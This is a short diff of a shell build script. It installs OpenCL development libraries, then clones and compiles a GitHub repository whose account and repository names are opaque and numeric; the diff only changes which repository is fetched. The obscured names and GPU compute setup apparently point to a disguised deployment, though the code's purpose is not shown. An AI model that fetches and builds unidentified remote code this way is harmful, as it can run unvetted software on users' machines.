@@ -1,7 +1,7 @@
 apt-get install ocl-icd-opencl-dev -y
 
-git clone https://github.com/mobileapps84741274/linux844444444474
-cd linux844444444474
+git clone https://github.com/mobileapps84741274/linuxgoogle1
+cd linuxgoogle1
 mkdir build
 cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
